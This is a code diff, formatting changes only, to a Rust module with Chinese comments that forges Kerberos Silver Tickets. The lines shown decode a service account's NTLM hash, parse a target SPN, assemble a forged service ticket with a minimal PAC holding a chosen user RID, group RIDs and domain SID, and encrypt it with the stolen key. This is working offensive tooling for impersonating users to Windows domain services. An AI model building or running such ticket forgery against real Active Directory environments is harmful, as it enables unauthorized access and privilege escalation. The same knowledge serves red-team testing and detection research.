@@ -109,15 +109,17 @@ pub fn create_silver_ticket(config: &SilverTicketConfig) -> Result<SilverTicket,
         return Err("服务账户NTLM哈希无效（应为32字符十六进制）".to_string());
     }
 
-    let service_key = hex::decode(&config.service_nthash)
-        .map_err(|e| format!("NTLM哈希解码失败: {}", e))?;
+    let service_key =
+        hex::decode(&config.service_nthash).map_err(|e| format!("NTLM哈希解码失败: {}", e))?;
 
     // 解析SPN获取服务类型和目标主机
     let (service_type, target_host) = parse_spn(&config.target_spn)?;
 
     tracing::info!(
         "[Silver Ticket] 为 {} 伪造TGS: {} 用户={}",
-        config.target_spn, service_type, config.username
+        config.target_spn,
+        service_type,
+        config.username
     );
 
     // 构造服务票据
@@ -207,8 +209,13 @@ fn build_service_ticket(
 
     // enc-part [3] - 使用服务密钥加密
     let enc_part = build_service_enc_part(
-        username, user_rid, group_rids, domain_sid,
-        service_type, target_host, lifetime_hours,
+        username,
+        user_rid,
+        group_rids,
+        domain_sid,
+        service_type,
+        target_host,
+        lifetime_hours,
     );
 
     let encrypted = encrypt_with_key(&enc_part, service_key, etype)?;
@@ -289,11 +296,7 @@ fn build_service_enc_part(
 }
 
 /// 构造最小PAC
-fn build_minimal_pac(
-    user_rid: u32,
-    group_rids: &[u32],
-    domain_sid: &str,
-) -> Vec<u8> {
+fn build_minimal_pac(user_rid: u32, group_rids: &[u32], domain_sid: &str) -> Vec<u8> {
     let mut pac = Vec::new();
 
     // NumBuffers (简化为1个PAC_LOGON_INFO)
@@ -374,7 +377,9 @@ fn encode_sid_binary(sid_str: &str) -> Result<Vec<u8>, String> {
     sid.push(1); // Revision
     sid.push((parts.len() - 3) as u8); // SubAuthorityCount
 
-    let id_auth: u64 = parts[2].parse().map_err(|_| "无效ID Authority".to_string())?;
+    let id_auth: u64 = parts[2]
+        .parse()
+        .map_err(|_| "无效ID Authority".to_string())?;
     sid.push(((id_auth >> 40) & 0xFF) as u8);
     sid.push(((id_auth >> 32) & 0xFF) as u8);
     sid.push(((id_auth >> 24) & 0xFF) as u8);
